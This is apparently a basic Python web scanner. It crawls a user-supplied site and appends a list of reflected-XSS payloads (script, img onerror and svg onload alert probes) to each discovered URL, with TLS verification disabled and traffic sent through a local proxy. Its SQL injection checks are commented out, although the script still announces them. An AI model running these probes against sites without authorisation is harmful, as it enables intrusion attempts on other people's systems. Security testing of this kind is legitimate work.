import requests, sys
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import time
import random, re
from urllib.parse import urlparse, urljoin
from requests.exceptions import SSLError, ConnectionError

proxies = {'http': 'http://127.0.0.1:8081', 'https': 'http://127.0.0.1:8081'}

def get_response(url, retries=3):
    """
    Sends an HTTP GET request to the specified URL, with retries in case of failure.

    Args:
        url (str): The URL to send the request to.
        retries (int): The number of times to retry the request in case of failure. Default is 3.

    Returns:
        Response object if the request is successful (status code 200).
        Returns None if the maximum number of retries is reached without success.
    
    Raises:
        Prints a message if the request results in an error (e.g., ConnectionError, SSLError).
    """
    for i in range(retries):
        try:
            r = requests.get(url, verify=False, proxies=proxies, timeout=10)
            if r.status_code == 200:
                return r
            elif r.status_code == 403:
                print(f"[+] Congratulations, your website is secure: access to {url} was blocked with a 403 (Forbidden) code.")
                return r
        except (requests.RequestException, SSLError, ConnectionError) as e:
            print(f"[-] Connection error to {url}: {e}")
            time.sleep(random.uniform(1, 3))
    print(f"[-] Failed to retrieve {url} after {retries} retries.")
    return None


# try to get paths with get parameter
def find_urls_to_test(url, base_url):
    """
    Attempts to discover URLs with GET parameters from the given page.

    Args:
        url (str): The URL of the page to be analyzed.
        base_url (str): The base URL used to build full URLs from relative links.

    Returns:
        set: A set of discovered URLs containing query parameters or potential targets.

    Description:
        - Retrieves the content of the page specified by `url`.
        - Parses the HTML and looks for `<a>` tags to extract links.
        - Builds full URLs from relative links based on the base URL.
        - Filters out links that don't match the base URL's domain.
        - Additionally searches through `<script>` content if no parameterized URLs are found.
        - Returns a set of URLs to test for vulnerabilities.
    """
    
    response = get_response(url)
    if not response:
        return set()

    soup = BeautifulSoup(response.text, 'html.parser')

    base_url = base_url.rstrip('/')
    parsed_base_url = urlparse(base_url)

    links = set()
    for a_tag in soup.find_all('a', href=True):
        href = a_tag['href']
        
        parsed_href = urlparse(href)
        if parsed_href.netloc and parsed_href.netloc != parsed_base_url.netloc:
            continue
        
        if href.startswith('/'):
            full_url = base_url + href
        elif href.startswith('http'):
            full_url = href
        else:
            full_url = f"{base_url}/{href}"
            
        if "Id" not in href:
            links.add(full_url)
            if "?" in href:
              links.add(full_url)
            elif href.startswith('/'):
               links.add(full_url)
        
        #links.add(full_url)
      
    if not links:
        print("[!] No parameterized URLs found, searching deeper in the page source...")
        scripts = soup.find_all('script')
        for script in scripts:
            if "?" in script.text:
                print("[+] Found a possible URL in script content.")
                links.add(script.text)

    if not links:
        print("[-] No URLs with parameters found.")
    else:
        print(f"[+] Found {len(links)} URLs")
    
    return links

def exploit_xss(url):
    """
    Attempts to perform Cross-Site Scripting (XSS) on the target URL.

    Args:
        url (str): The target URL for the XSS test.

    Description:
        - Iterates through a list of common XSS payloads.
        - Appends each payload to the target URL and sends an HTTP request.
        - If the payload is successfully injected (e.g., the response contains the payload),
          the URL is considered vulnerable.
        - Handles SSL and request-related errors.
    """
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "';alert('XSS');//",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "'<script>alert('XSS')</script>'",
        "\"<script>alert('XSS')</script>\""
    ]

    for payload in xss_payloads:
        # Construct the target URL with the XSS payload
        target_url = url + payload
        try:
            # Send the request with the XSS payload
            r = requests.get(target_url, verify=False, proxies=proxies, timeout=10)
            
            # Check if the payload is reflected in the response, indicating a potential XSS vulnerability
            if payload in r.text:
                print(f"[+] XSS vulnerability found with payload: {payload}")
                return True
            else:
                print(f"[-] Payload not reflected for: {payload}")
        except SSLError as e:
            print(f"[-] SSL Error on {target_url}: {e}")
            return False
        except requests.RequestException as e:
            print(f"[-] Request error on {target_url}: {e}")
            return False

    print("[-] No XSS vulnerabilities found.")
    return False



if __name__ == "__main__":
    
    base_url = input("Enter the URL you want to scan: ").strip()
    base_url = base_url.rstrip('/')

    print("[+] Inspecting the different paths for the entered page...")
    urls_to_test = find_urls_to_test(base_url, base_url)

    if urls_to_test:
        # print("[+] Found the following URLs with parameters:")
        for url in urls_to_test:
            print(url)

        print("\n[+] Testing each URL for SQL Injection vulnerabilities...")

        for test_url in urls_to_test:
            print(f"\n[+] Testing URL: {test_url}")
            
            # Test for general SQL injection vulnerabilities
            #is_vulnerable = exploit_sqli(test_url)
             
            #if not is_vulnerable:
            #    num_col = exploit_sqli_column_number(test_url)
            #    if num_col:
                    #print(f"[+] Vulnerable URL found: {test_url}")
            #        print(f"[+] We determined that your database has {num_col} columns at this URL, as the server did not handle exceptions properly during the SQL query.")
            #    else:
            #        print("[-] URL not vulnerable to sql injection")
            
            exploit_xss(test_url)
            
    else:
        print("[-] No URLs with parameters found.")



